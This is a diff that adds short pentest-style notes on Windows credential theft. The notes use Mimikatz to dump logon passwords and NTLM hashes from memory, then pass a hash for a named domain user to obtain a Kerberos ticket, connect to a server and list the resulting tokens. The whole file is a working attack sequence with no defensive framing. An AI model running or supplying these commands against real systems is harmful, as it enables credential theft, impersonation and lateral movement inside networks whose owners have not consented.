@@ -1,0 +1,13 @@
+# We can have the NTLM hash:
+.\mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords
+
+# Then we can require a Kerberos ticket using NTLM hash:
+sekurlsa::pth /user:user01 /domain:superalex.sec /ntlm:369def79dxxxxxxx64cc93075 /run:powershell
+
+# Need to generate a TGT authenticating the network:
+net use \\Server01
+
+# Now we have token:
+klist
